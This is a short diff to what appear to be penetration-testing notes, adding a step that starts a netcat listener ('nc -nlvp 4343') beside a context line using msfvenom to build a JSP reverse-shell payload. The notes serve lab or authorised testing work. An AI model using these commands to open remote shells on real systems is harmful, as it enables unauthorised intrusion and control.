@@ -14,4 +14,8 @@ After running the vulners script OR autorecon, we should find some vulnerable po
 
 3. Next, we will execute the script. Depending on the type of exploit this step might look dramatically different.
 
+For most scripts we will need to first start by setting up a listener on our machine, this command commonly looks like
+
+nc -nlvp 4343
+
 -- For .jsp files we will use the following script to create the payload 'sudo msfvenom -p java/jsp_shell_reverse_tcp lhost=<my ip> port=4343 -f raw > payload.jsp
